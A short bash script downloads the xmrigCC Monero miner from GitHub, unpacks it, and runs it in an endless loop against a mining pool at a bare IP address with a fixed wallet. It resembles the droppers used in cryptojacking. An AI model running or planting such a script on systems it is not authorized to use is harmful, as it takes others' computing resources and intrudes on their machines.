#!/bin/bash

wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.2/xmrigCC-miner_only-3.4.2-linux-generic-static-amd64.tar.gz
tar -xvf xmrigCC-miner_only-3.4.2-linux-generic-static-amd64.tar.gz
rm xmrigCC-miner_only-3.4.2-linux-generic-static-amd64.tar.gz

while true; do
  ./xmrigDaemon --url 95.179.241.203:80 --user 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
done